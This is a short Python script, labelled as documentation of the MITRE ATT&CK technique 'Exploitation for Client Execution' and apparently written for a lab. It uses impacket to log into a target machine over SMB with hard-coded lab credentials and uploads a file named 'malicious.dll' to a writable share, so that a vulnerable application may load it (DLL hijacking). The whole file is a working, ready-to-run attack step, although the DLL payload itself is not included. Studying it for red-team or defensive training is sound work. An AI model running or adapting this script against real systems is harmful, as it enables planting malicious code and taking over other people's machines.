# < ---- DOCUMENTATION OF MITRE ATT&CK TECHNIQUE ---- >
# T1203 - Exploitation for Client Execution
# Objective: Exploit a vulnerability. This script demonstrates a common technique: 
# planting a malicious DLL in a path where a vulnerable application will load it instead of the legitimate one (DLL Hijacking).
# The script uploads the malicious.dll to a writable application directory.

#!/usr/bin/env python3
import sys
import os
from impacket.smbconnection import SMBConnection

# ---------------- CONFIG ----------------
TARGET_IP = "192.168.227.139"
USERNAME = "labadmin"
PASSWORD = "Password123!"
DOMAIN = "WORKGROUP"

# DLL to upload (must exist locally)
LOCAL_DLL = "malicious.dll"

# Target location (USER-writable is key)
REMOTE_SHARE = "LABSHARE"
REMOTE_DIR = ""
REMOTE_DLL_NAME = "malicious.dll"
# ----------------------------------------

def upload_dll():
    print(f"[*] Connecting to {TARGET_IP} via SMB...")

    try:
        smb = SMBConnection(
            remoteName=TARGET_IP,
            remoteHost=TARGET_IP,
            sess_port=445
        )

        smb.login(USERNAME, PASSWORD, DOMAIN)
        print("[+] SMB authentication successful")

        if not os.path.exists(LOCAL_DLL):
            print(f"[-] Local DLL '{LOCAL_DLL}' not found")
            return

        remote_path = REMOTE_DLL_NAME

        print(f"[*] Uploading DLL to {REMOTE_SHARE}:{remote_path}")

        with open(LOCAL_DLL, "rb") as dll:
            smb.putFile(
                REMOTE_SHARE,
                remote_path,
                dll.read
            )

        print("[+] DLL successfully uploaded!")
        print("[!] When the vulnerable app runs, it may load this DLL (T1203)")

        smb.logoff()

    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    upload_dll()